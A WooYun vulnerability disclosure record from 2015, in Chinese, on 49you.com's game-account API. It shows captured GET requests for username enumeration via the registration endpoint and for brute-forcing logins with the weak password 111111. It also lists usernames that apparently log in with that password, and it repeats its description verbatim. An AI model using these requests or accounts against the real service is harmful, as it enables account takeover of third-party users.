{"id": 28352, "wybug_id": "wooyun-2015-0122778", "wybug_title": "49游某接口逻辑缺陷设计缺陷可进行扫号（可获取大量账号密码）", "wybug_corp": "49you.com", "wybug_author": "艾薇儿", "wybug_date": "2015-06-25 22:12", "wybug_open_date": "2015-08-10 02:16", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向公众公开  简要描述： RT 听说厂商很任性哇 详细说明：  0x01 49you手游 http://m.49you.com/ 登录功能没有设置验证码及登录错误次数限制，导致可爆破密码或撞库 0x02  首先我们可以通过注册功能来获取一部分用户名  \n\n 用户名为字母与数字组合 \n\n 这个注册功能的验证码不会刷新，那我们就可以抓取这个请求。来获取一部分用户名字典 注册的请求为GET请求，，，，很是 “给力” \nGET /V7/Accounts/WebRegister?callback=jQuery18305054380079761739_1435239707930&requestId=233&sign=233&appId=233&password=111111&code=2837&name=a123456&device=3&_=1435240405535 HTTP/1.1Host: api.sdk.49app.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://m.49you.com/Cookie: verify=353de26971b93af88da102641069b440Connection: keep-alive\n放到工具里面跑用户名的发现一个问题length 507的为 已经存在的用户名 \n\nlength 2333的 为注册成功。。。。。批量注册用户哇，也是一个安全问题\n\n继续说撞库和爆破吧 测试登录，抓取登录的请求，也是GET  想想也是醉了\nGET /V7/Accounts/LogOn?callback=jQuery18305054380079761739_1435239707930&requestId=233&sign=233&ver=233&userName=123456&password=111111&appId=233&device=3&_=1435240922900 HTTP/1.1Host: api.sdk.49app.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://m.49you.com/Cookie: verify=353de26971b93af88da102641069b440Connection: keep-alive\n放到工具去批量跑下弱密码 111111 账号密码错误的 \n\n 登录成功的 \n\n测试登录\n\n部分账号：用户名后➕1aaaaaa1aaberg1aachen1aahing1aaliis1aammii1aargau1aarhus1aarika1aarrgh1ababua1abacas1abacay1abacli1abacot1abacus1abadan1abadia1abakan1abakas1abamps1abanet1abanga1abanic1abaris1abased1abaser1abases1abasgi1abasia1。。。。。   漏洞证明：  0x01 49you手游 http://m.49you.com/ 登录功能没有设置验证码及登录错误次数限制，导致可爆破密码或撞库 0x02  首先我们可以通过注册功能来获取一部分用户名  \n\n 用户名为字母与数字组合 \n\n 这个注册功能的验证码不会刷新，那我们就可以抓取这个请求。来获取一部分用户名字典 注册的请求为GET请求，，，，很是 “给力” \nGET /V7/Accounts/WebRegister?callback=jQuery18305054380079761739_1435239707930&requestId=233&sign=233&appId=233&password=111111&code=2837&name=a123456&device=3&_=1435240405535 HTTP/1.1Host: api.sdk.49app.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://m.49you.com/Cookie: verify=353de26971b93af88da102641069b440Connection: keep-alive\n放到工具里面跑用户名的发现一个问题length 507的为 已经存在的用户名 \n\nlength 2333的 为注册成功。。。。。批量注册用户哇，也是一个安全问题\n\n继续说撞库和爆破吧 测试登录，抓取登录的请求，也是GET  想想也是醉了\nGET /V7/Accounts/LogOn?callback=jQuery18305054380079761739_1435239707930&requestId=233&sign=233&ver=233&userName=123456&password=111111&appId=233&device=3&_=1435240922900 HTTP/1.1Host: api.sdk.49app.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://m.49you.com/Cookie: verify=353de26971b93af88da102641069b440Connection: keep-alive\n放到工具去批量跑下弱密码 111111 账号密码错误的 \n\n 登录成功的 \n\n测试登录\n\n部分账号：用户名后➕1aaaaaa1aaberg1aachen1aahing1aaliis1aammii1aargau1aarhus1aarika1aarrgh1ababua1abacas1abacay1abacli1abacot1abacus1abadan1abadia1abakan1abakas1abamps1abanet1abanga1abanic1abaris1abased1abaser1abases1abasgi1abasia1。。。。。   修复方案：   加验证码及登录次数限制   版权声明：转载请注明来源 艾薇儿@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-06-26 02:14 厂商回复： 影响不大，但还是感谢提交漏洞，稍后统一小礼物送上，叁万还在等着你们！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-25 22:14 |    \t\t咸鱼翻身 \t\t\t( 普通白帽子  |\t\t\t        Rank:576 漏洞数:108        )\t\t \n  就知道是这个。。。。。还有好几处呢。。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}